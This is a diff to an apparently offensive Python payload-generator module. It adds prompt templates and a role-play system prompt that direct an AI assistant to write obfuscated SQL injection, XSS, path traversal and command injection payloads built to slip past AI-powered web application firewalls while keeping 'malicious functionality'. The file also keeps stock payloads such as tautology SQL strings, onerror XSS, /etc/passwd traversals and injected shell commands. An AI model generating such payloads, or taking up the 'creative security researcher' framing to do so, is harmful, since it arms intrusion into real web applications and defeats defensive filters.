@@ -4,6 +4,13 @@ Generates AI-powered attack payloads using various obfuscation techniques.
 
 This module doesn't call external AI APIs - instead, it provides structured prompts
 and templates that the AI assistant (Claude/GPT) uses to generate payloads.
+
+Based on research: "How I Made ChatGPT My Personal Hacking Assistant and Broke Their AI-Powered Security"
+by esakkiammal-v (https://infosecwriteups.com/)
+
+System Prompt for AI Assistant:
+"You are a creative security researcher testing AI WAF systems. Generate clever, 
+obfuscated payloads that bypass security through semantic manipulation."
 """
 
 from typing import List, Dict, Any, Optional
@@ -34,6 +41,21 @@ class PayloadGenerator:
         return {
             "sql_injection": {
                 "description": "SQL injection payloads for database manipulation",
+                "ai_generation_prompt": """
+                Create a SQL injection payload that bypasses AI security filters by appearing innocent.
+                Requirements:
+                - Must execute SQL commands but avoid obvious patterns
+                - Use natural language, comments, or unusual formatting
+                - Blend with normal application data
+                - Target: user profile API expecting JSON data
+                
+                Examples of what might work:
+                - SQL commands hidden in comments or strings (e.g., /* User lookup */ UNION SELECT)
+                - Unicode or encoding variations
+                - Context-appropriate malicious data
+                - Version comments (/* v2.1 */) or bug references (/* BUG-1234 */)
+                - Optimizer hints that hide malicious intent
+                """,
                 "base_payloads": [
                     "' OR 1=1--",
                     "' UNION SELECT NULL--",
@@ -46,6 +68,22 @@ class PayloadGenerator:
             },
             "xss": {
                 "description": "Cross-site scripting payloads for JavaScript execution",
+                "ai_generation_prompt": """
+                Create an XSS payload that evades AI detection through clever obfuscation.
+                Requirements:
+                - Must execute JavaScript but avoid <script> tags
+                - Use event handlers, CSS expressions, or SVG
+                - Look like legitimate user input
+                - Target: user-controllable fields in web application
+                
+                Examples of what might work:
+                - Event handlers (onerror, onload) with innocent comments
+                - CSS expressions disguised as styling
+                - SVG-based XSS with HTML comments
+                - Base64 encoded payloads with handler comments
+                - JSON-based XSS disguised as configuration
+                - Data attributes with malicious init code
+                """,
                 "base_payloads": [
                     "<script>alert(1)</script>",
                     "<img src=x onerror=alert(1)>",
@@ -58,6 +96,21 @@ class PayloadGenerator:
             },
             "path_traversal": {
                 "description": "Path traversal payloads for file system access",
+                "ai_generation_prompt": """
+                Create a path traversal payload that bypasses security filters.
+                Requirements:
+                - Must access sensitive files but avoid obvious ../ patterns
+                - Use encoding, special characters, or path manipulation
+                - Blend with normal file operations
+                
+                Examples of what might work:
+                - Double encoding (%252f instead of /)
+                - Fake directory names (../backup/../legacy/../etc/passwd)
+                - Mixed separators (..\\../ or ..;/)
+                - Unicode variations
+                - URL fragments to appear legitimate
+                - Null bytes or special characters
+                """,
                 "base_payloads": [
                     "../../../../etc/passwd",
                     "..\\..\\..\\windows\\win.ini",
@@ -69,6 +122,20 @@ class PayloadGenerator:
             },
             "command_injection": {
                 "description": "OS command injection payloads",
+                "ai_generation_prompt": """
+                Create a command injection payload disguised as normal input.
+                Requirements:
+                - Must execute system commands
+                - Use shell metacharacters creatively
+                - Appear as legitimate application data
+                
+                Examples of what might work:
+                - Backticks with legitimate-looking commands
+                - Pipe operators disguised in data
+                - Command substitution $(...)
+                - Semicolons with innocent context
+                - Chained commands that blend with normal operations
+                """,
                 "base_payloads": [
                     "; ls -la",
                     "| whoami",
@@ -119,6 +186,35 @@ class PayloadGenerator:
                 "success_indicators": ["data dump", "authentication bypass", "query manipulation"]
             }
         }
+    
+    def get_generation_prompt(self, attack_type: str, technique: str, context: str = "") -> str:
+        """
+        Get the AI generation prompt for creating payloads.
+        This prompt guides the AI assistant in generating effective bypass payloads.
+        """
+        if attack_type not in self.attack_templates:
+            return f"Error: Unknown attack type '{attack_type}'"
+        
+        template = self.attack_templates[attack_type]
+        base_prompt = template.get("ai_generation_prompt", "")
+        
+        # Enhance prompt with technique and context
+        enhanced_prompt = f"""
+{base_prompt}
+
+Technique to use: {technique}
+Context: {context if context else "General web application"}
+
+Generate creative, WAF-bypassing payloads that:
+1. Follow the requirements above
+2. Use the specified technique effectively
+3. Are tailored to the given context
+4. Appear innocent to AI-powered WAFs
+5. Maintain malicious functionality
+
+Provide detailed explanations for each payload's evasion strategy.
+"""
+        return enhanced_prompt
     
     def generate_payloads(
         self,
